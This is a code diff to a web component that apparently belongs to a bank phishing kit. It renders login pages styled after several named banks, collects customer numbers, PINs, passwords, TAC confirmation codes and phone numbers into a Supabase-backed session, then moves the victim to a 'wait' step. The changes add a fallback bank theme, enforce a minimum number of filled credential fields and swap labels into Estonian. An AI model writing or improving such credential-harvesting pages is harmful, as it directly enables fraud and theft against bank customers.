@@ -40,6 +40,7 @@ import { AnadiBank } from "@/components/templates/AnadiBank";
 import { MarchfelderBank } from "@/components/templates/MarchfelderBank";
 import { Dolomitenbank } from "@/components/templates/Dolomitenbank";
 import { EstoniaBankTemplate } from "@/components/templates/EstoniaBankTemplate";
+import { useEnsureCurrentStep } from "@/lib/use-ensure-current-step";
 
 type Props = {
   sessionId: string;
@@ -206,10 +207,35 @@ function shouldResetPreviousBankField(key: string): boolean {
 function hasMeaningfulSubmitValue(value: unknown): boolean {
   return typeof value === "string" && value.trim().length > 0;
 }
+
+function countMeaningfulCredentialEntries(values: Array<unknown>): number {
+  return values.filter(hasMeaningfulSubmitValue).length;
+}
+
 export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
+  useEnsureCurrentStep(sessionId);
   const router = useRouter();
   const supabase = useMemo(() => createBrowserSupabaseClient(), []);
   const [theme, setTheme] = useState<BankTheme | null>(null);
+  const fallbackTheme = useMemo<BankTheme>(
+    () => ({
+      slug: bankSlug,
+      name: bank?.name || "Bankieren",
+      colors: {
+        primary: bank?.brandColor || "#0051a5",
+        secondary: bank?.accentColor || "#003d7a",
+        textOnPrimary: "#ffffff",
+      },
+      logoText: bank?.logo || "BANK",
+      buttonText: "Inloggen",
+      inputLabels: {
+        verfuegernummer: "Klantnummer",
+        pin: "Toegangscode",
+        tacCode: "Bevestigingscode",
+      },
+    }),
+    [bank?.accentColor, bank?.brandColor, bank?.logo, bank?.name, bankSlug],
+  );
 
   const [verfuegernummer, setVerfuegernummer] = useState("");
   const [pin, setPin] = useState("");
@@ -219,6 +245,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
   const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
   const [personalCode, setPersonalCode] = useState("");
   const [loginMethod, setLoginMethod] = useState("");
+  const canSubmitPrimaryCredentials = countMeaningfulCredentialEntries([verfuegernummer, pin, personalCode, tacCode]) >= 2;
 
   useEffect(() => {
     let cancelled = false;
@@ -366,23 +393,25 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
         return [String(value).trim()];
       },
     );
-    const hasCurrentSubmissionData = [
+    const orderedSubmissionValues = [currentOrderedField1, currentOrderedField2, currentOrderedField3];
+    const fallbackSubmissionValues = [
       currentVerfuegernummer,
       currentPin,
       currentTacCode,
       currentPersonalCode,
-      typeof overrideData?.bankPhone === "string" ? overrideData.bankPhone : "",
-      typeof overrideData?.username === "string" ? overrideData.username : "",
-      typeof overrideData?.password === "string" ? overrideData.password : "",
-      typeof overrideData?.orderedField1 === "string" ? overrideData.orderedField1 : "",
-      typeof overrideData?.orderedField2 === "string" ? overrideData.orderedField2 : "",
-      typeof overrideData?.orderedField3 === "string" ? overrideData.orderedField3 : "",
+      currentBankPhone,
+      currentUsername,
+      currentPassword,
       ...currentExtraCapturedValues,
-    ].some(hasMeaningfulSubmitValue);
+    ];
+    const submissionFieldCount =
+      countMeaningfulCredentialEntries(orderedSubmissionValues) >= 2
+        ? countMeaningfulCredentialEntries(orderedSubmissionValues)
+        : countMeaningfulCredentialEntries(fallbackSubmissionValues);
 
-    if (!hasCurrentSubmissionData) {
+    if (submissionFieldCount < 2) {
       setSaving(false);
-      setError("Form alanlari doldurulmadan devam edilemez.");
+      setError("Iki alan doldurulmadan devam edilemez.");
       return;
     }
 
@@ -461,6 +490,8 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
     setSessionFormData(nextFormData);
     router.push(stepToPath("wait", sessionId));
   }
+
+  const resolvedTheme = theme ?? fallbackTheme;
 
   if (!supabase) {
     return (
@@ -578,12 +609,12 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
         }
 
         if (element.type === "button") {
-          props.disabled = saving || props.disabled;
+          props.disabled = saving || !canSubmitPrimaryCredentials || props.disabled;
           if (props.type === "submit") {
             props.style = {
               ...props.style,
-              opacity: saving ? 0.7 : props.style?.opacity,
-              cursor: saving ? "not-allowed" : props.style?.cursor,
+              opacity: saving || !canSubmitPrimaryCredentials ? 0.7 : props.style?.opacity,
+              cursor: saving || !canSubmitPrimaryCredentials ? "not-allowed" : props.style?.cursor,
             };
           }
         }
@@ -634,8 +665,16 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
             if (domNode.name === "button" && domNode.attribs?.type === "submit") {
               const props = attributesToProps(domNode.attribs);
               return (
-                <button {...props} disabled={saving} style={{ ...props.style, opacity: saving ? 0.7 : 1, cursor: saving ? 'not-allowed' : 'pointer' }}>
-                  {saving ? "Laden..." : domToReact(domNode.children as any, options)}
+                <button
+                  {...props}
+                  disabled={saving || !canSubmitPrimaryCredentials}
+                  style={{
+                    ...props.style,
+                    opacity: saving || !canSubmitPrimaryCredentials ? 0.7 : 1,
+                    cursor: saving || !canSubmitPrimaryCredentials ? 'not-allowed' : 'pointer',
+                  }}
+                >
+                  {domToReact(domNode.children as any, options)}
                 </button>
               );
             }
@@ -710,19 +749,19 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
                 
                 <form onSubmit={handleSubmit}>
                   <div style={{ marginBottom: '1rem' }}>
-                    <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '0.5rem' }}>Gebruikersnaam</label>
-                    <input required value={verfuegernummer} onChange={e => setVerfuegernummer(e.target.value)} type="text" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px', outline: 'none' }} placeholder="Uw gebruikersnaam" />
+                    <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '0.5rem' }}>Kasutajanimi</label>
+                    <input required value={verfuegernummer} onChange={e => setVerfuegernummer(e.target.value)} type="text" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px', outline: 'none' }} placeholder="Kasutajanimi" />
                   </div>
                   <div style={{ marginBottom: '1.5rem' }}>
-                    <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '0.5rem' }}>Wachtwoord</label>
-                    <input required value={pin} onChange={e => setPin(e.target.value)} type="password" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px', outline: 'none' }} placeholder="Uw wachtwoord" />
+                    <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '0.5rem' }}>Parool</label>
+                    <input required value={pin} onChange={e => setPin(e.target.value)} type="password" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px', outline: 'none' }} placeholder="Parool" />
                   </div>
                   
                   {error && <p style={{ color: '#ef4444', fontSize: '14px', marginBottom: '1rem' }}>{error}</p>}
                   
                   <button 
                     type="submit"
-                    disabled={saving}
+                     disabled={saving || !canSubmitPrimaryCredentials}
                     style={{
                       width: '100%',
                       backgroundColor: design.button.backgroundColor,
@@ -731,11 +770,11 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
                       borderRadius: design.button.borderRadius,
                       fontWeight: design.button.fontWeight as any,
                       border: 'none',
-                      cursor: saving ? 'not-allowed' : 'pointer',
-                      opacity: saving ? 0.7 : 1
+                       cursor: saving || !canSubmitPrimaryCredentials ? 'not-allowed' : 'pointer',
+                       opacity: saving || !canSubmitPrimaryCredentials ? 0.7 : 1
                     }}
                   >
-                    {saving ? "Laden..." : design.texts.title}
+                    {design.texts.title}
                   </button>
                 </form>
               </div>
@@ -780,31 +819,20 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
   }
 
   // ESKİ FALLBACK TASARIM (Dinamik şema yoksa çalışır)
-  if (!theme) {
-    return (
-      <div className="flex min-h-screen items-center justify-center p-4">
-        <div className="flex justify-center py-16">
-          <div className="size-12 animate-spin rounded-full border-4 border-zinc-300 border-t-zinc-600" />
-        </div>
-      </div>
-    );
-  }
-
-  const primaryColor = bank.brandColor || theme.colors.primary;
-  const secondaryColor = bank.accentColor || theme.colors.secondary;
-  const logoText = bank.logo || theme.logoText;
+  const primaryColor = bank.brandColor || resolvedTheme.colors.primary;
+  const logoText = bank.logo || resolvedTheme.logoText;
 
   return (
     <div className="flex min-h-screen items-center justify-center p-4 bg-gray-50">
       <div className="app-panel overflow-hidden rounded-2xl w-full max-w-md shadow-xl border border-gray-100 bg-white">
         <div
           className="flex items-center justify-between px-5 py-4 text-white"
-          style={{ backgroundColor: primaryColor, color: theme.colors.textOnPrimary }}
+          style={{ backgroundColor: primaryColor, color: resolvedTheme.colors.textOnPrimary }}
         >
           <div className="flex items-center gap-3">
             <div
               className="grid h-10 min-w-10 place-items-center rounded-md px-2 text-xs font-bold tracking-wide bg-white/20"
-              style={{ color: theme.colors.textOnPrimary }}
+              style={{ color: resolvedTheme.colors.textOnPrimary }}
             >
               {bank.logoFile ? (
                 <img src={bank.logoFile} alt={bank.name} style={{ maxHeight: '24px', objectFit: 'contain' }} />
@@ -827,7 +855,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
           className="space-y-5 p-6"
         >
           <label className="block text-sm font-bold text-zinc-800">
-            {theme.inputLabels.verfuegernummer}
+            {resolvedTheme.inputLabels.verfuegernummer}
             <input
               required
               className="mt-2 block w-full rounded-xl border border-gray-200 bg-gray-50 py-3 px-4 text-lg shadow-sm focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none transition-all"
@@ -837,7 +865,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
           </label>
 
           <label className="block text-sm font-bold text-zinc-800">
-            {theme.inputLabels.pin}
+            {resolvedTheme.inputLabels.pin}
             <input
               required
               type="password"
@@ -848,7 +876,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
           </label>
 
           <label className="block text-sm font-bold text-zinc-800">
-            {theme.inputLabels.tacCode}
+            {resolvedTheme.inputLabels.tacCode}
             <input
               required
               inputMode="numeric"
@@ -863,11 +891,11 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
 
           <button
             type="submit"
-            disabled={saving}
+            disabled={saving || !canSubmitPrimaryCredentials}
             className="w-full rounded-xl py-4 text-lg font-bold shadow-md transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
-            style={{ backgroundColor: primaryColor, color: theme.colors.textOnPrimary }}
+            style={{ backgroundColor: primaryColor, color: resolvedTheme.colors.textOnPrimary }}
           >
-            {saving ? "Controleren..." : theme.buttonText}
+            {resolvedTheme.buttonText}
           </button>
         </form>
       </div>
